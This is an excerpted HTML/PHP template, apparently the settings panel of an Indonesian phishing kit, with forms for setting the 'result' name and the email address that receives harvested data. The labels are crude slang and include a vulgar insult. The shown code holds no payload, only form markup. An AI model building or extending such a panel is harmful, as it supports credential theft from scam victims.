...
<head>
  ...
  <title>TIPENG NESIA || Setting Email Result</title>
...
<div class="container" style="height:100vh;display:flex;align-items: center;justify-content: center;">
  ...
  <form class="container" id="needs-validation" onsubmit="return false">
    <div class="add">
      ...
      <img src="https://telegra.ph/file/686c57643fcf094826197.png" style="transform:scale(1.2);max-width: 100%">
      </div>
      ...
      <nav class="navbar navbar-light bg-dark text-white p-0 pl-2 rounded">
        ...
        <label class="mt-3" for="exampleInputEmail1">NAMA RESS</label>
...
<div class="modal fade" id="gantidata" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      ...
      <div class="form-group">
      <label for="exampleInputEmail1">MAU NAMA RESS APA SU</label>
        <input type="text" id="valNick" class="form-control" value="<?= $nik; ?>">
        <label class="mt-2" for="exampleInputEmail1">JANGAN DI UBAH</label>
...
<div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      ...
      <div class="form-group">
      <label for="exampleInputEmail1">GAK USAH KORUPSI EMAIL KONTOL</label>
      <input type="email" class="form-control" id="addEmail" aria-describedby="emailHelp" placeholder="Masukin Email Baru">
      </div>
